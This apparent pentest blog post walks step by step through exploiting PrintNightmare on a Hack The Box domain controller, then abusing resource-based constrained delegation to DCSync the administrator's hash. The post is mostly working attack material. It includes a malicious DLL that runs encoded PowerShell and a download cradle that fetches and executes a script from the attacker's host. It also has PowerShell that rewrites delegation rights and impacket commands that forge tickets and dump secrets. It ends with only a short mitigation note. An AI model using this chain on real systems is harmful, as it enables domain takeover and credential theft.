---
layout: post
title: "Leveraging PrintNightmare to Abuse RBCD and DCSync the Domain"
date: 2021-06-30 23:00:00 +0300
author: snovvcrash
tags: [internal-pentest, active-directory, print-spooler, printer-bug, cve-2021-16751, cve-2021-34527, arbitary-file-write, impacket, rbcd]
---

A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675 / CVE-2021-34527) by configuring and abusing RBCD on a domain controller.

<!--cut-->

![banner.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/banner.png)
{:.center-image}

* TOC
{:toc}

## Prologue

The recent [PrintNightmare](https://github.com/afwu/PrintNightmare) exploit (post CVE-2021-1675, *UPD: a few days later Microsoft assinged it a brand new **CVE-2021-34527***) abuses <strike>in</strike>famous Print Spooler service in order to load and execute arbitary code on a Windows machine.

I won't dive into the vulnerability analysis because exploit authors will definitely do it better on the upcoming Black Hat event. As for now a brief description of the attack [can be found on the GitHub](https://github.com/afwu/PrintNightmare#cve-2021-1675-analysis).

Thanks to [@cube0x0](https://twitter.com/cube0x0/status/1409928527957344262) now we have [an impacket-based exploit](https://github.com/cube0x0/CVE-2021-1675) to trigger RCE from a Linux box. Another thing I though about is the red team aspect when generating a custom DLL binary. Good old *msfvenom* is (totally) not enough to fly under the radar of commercial antivirus solutions and/or the SOC team operators. If you ask me, I'd rather not run any C2 agents on the DC but aim for standard Active Directory persistence techniques.

So, what can we do when having access to code execution on the behalf of DC machine account and nothing more? Here is when resource-based constrained delegation comes in: impersonating a computer account an adversary can configure RBCD bits for that specific computer object, so that a full AD compromise becomes possible with no need for [adding new users](https://github.com/newsoft/adduser) to privileged groups (which is surely monitored) or running "noisy" malicious stuff on the DC!

## Testing Environment

For demonstration purposes I will use [Multimaster](https://www.hackthebox.eu/home/machines/profile/232) - a retired machine from Hack The Box - as a lab to play with PrintNightmare:

```
Host Name:                 MULTIMASTER
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Domain:                    MEGACORP.LOCAL
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4054590
                           [03]: KB4512574
                           [04]: KB4520724
                           [05]: KB4530689
```

## A Living Nightmare

The first thing I want to do is to prepare a skeleton for malicious DLL binary that will source and execute a PowerShell script served by an HTTP server on my machine. To construct a DLL one may use [a template](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) from HackTricks. Another thing to remember is that a threaded approach should be used to run the command from the DLL in order not to kill the parent process of Spooler service when exiting (similar to `EXITFUNC=thread` when generating a payload with msfvenom). Otherwise the Spooler will probably die and you will not have a second chance to trigger the RCE if something goes wrong.

```c
// pwn.c

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

// Default function that is executed when the DLL is loaded
void Entry() {
    system("powershell -enc <BASE64_PWSH_CODE>");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Entry, 0, 0, 0);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
```

Next I will grab an example of [how RBCD bytes can be set with native PowerShell](https://github.com/hausec/Set-RBCDBytes/blob/main/Set-RBCDBytes.ps1) (by [@haus3c](https://twitter.com/haus3c)) and change the code for my case:

```powershell
$ID = New-Object System.Security.Principal.NTAccount("megacorp.local\fakemachine$")
$SID = $ID.Translate([System.Security.Principal.SecurityIdentifier]).ToString()
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$DN = ([adsisearcher]"(&(objectclass=computer)(name=MULTIMASTER))").FindOne().Properties.distinguishedname
$adsiobject = [ADSI]"LDAP://$DN"
$adsiobject.Put("msDS-allowedToActOnBehalfOfOtherIdentity", $SDBytes)
$adsiobject.setinfo()
```

Now I have to create a fake machine account to use it when it comes to requesting a forwardable ticket with S4U2Self & S4U2Proxy (some good references on how to abuse RBCD can be found on [PPN](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse#resource-based-constrained-delegation-rbcd) and in my [HTB Hades write-up](https://snovvcrash.rocks/2020/12/28/htb-hades.html#abusing-kerberos-resource-based-constrained-delegation)):

```bash
addcomputer.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179 -computer-name fakemachine -computer-pass 'Passw0rd2!'
```

[![create-fake-machine-account.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-fake-machine-account.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-fake-machine-account.png)

After the machine object is successfully created (in other words we control a domain account with an SPN) I will make a file containing a simple download cradle in PowerShell and convert it to UTF-16LE:

```bash
cat crandle.ps1
IEX(IWR http://10.10.14.11/rbcd.ps1 -UseBasicParsing)

cat crandle.ps1 | iconv -t UTF-16LE | base64 -w0
```

[![create-download-cradle.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)

I will put the resulting base64 command into the DLL source code and cross-compile it to x64 using MinGW:

```bash
x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared
```

[![compile-dll.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/compile-dll.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/compile-dll.png)

Then move the binary to the SMB share and [check that it's accessible](https://github.com/cube0x0/CVE-2021-1675#smb-configuration):

[![prepare-samba.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)

I will download and install [the modified impacket library](https://github.com/cube0x0/impacket) within a virtual environment as well as download [the exploit script](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py):

[![install-impacket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)

Note that dynamic `pDriverPath` (location of the `UNIDRV.DLL` binary) enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a couple of hours after the release - without it the adversary would have to change the script according to the environment:

```powershell
ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
```

[![get-pdriverpath.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)

Fire up an HTTP server with Python and trigger the bug:

```bash
python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10.10.14.11\share\pwn.dll'
```

[![trigger-the-exploit.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)

In the background it will set the `PrincipalsAllowedToDelegateToAccount` property containing objects that can delegate to MULTIMASTER. It can be verified like follows:

```powershell
Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
```

[![check-properties.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties.png)

Now I can request a service ticket for LDAP:

```bash
getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap/MULTIMASTER.megacorp.local -impersonate administrator
```

[![request-ticket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)

And finally DCSync the domain with `secretsdump.py`:

```bash
export KRB5CCNAME=/home/snovvcrash/PrintNightmare/CVE-2021-1675/administrator.ccache
secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -just-dc-user administrator
```

[![dcsync.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/dcsync.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/dcsync.png)

## Afterthoughts

The described vulnerability poses enormous risks to active directory infrastructures and must never be used for illegal purposes. To mitigate the risk the Spooler service should be disabled or uninstalled until an official fix is released by vendor. An example on how to disable the Print Spooler can be found [here](https://github.com/LaresLLC/CVE-2021-1675).

*UPD*. Depending on the state of a user's access token (elevated / non-elevated) whose account one's impersonating when making RPC calls to `RpcAddPrinterDriverEx`, the attack may succeed or fail. On the following diagram (by [@StanHacked](https://twitter.com/StanHacked)) there're some conditions that can affect the token state:

[![making-sence-of-printnightmare.png](https://pbs.twimg.com/media/E5ShO9wXwAAPAC9?format=jpg&name=4096x4096)](https://twitter.com/StanHacked/status/1410929974358515719/photo/1)
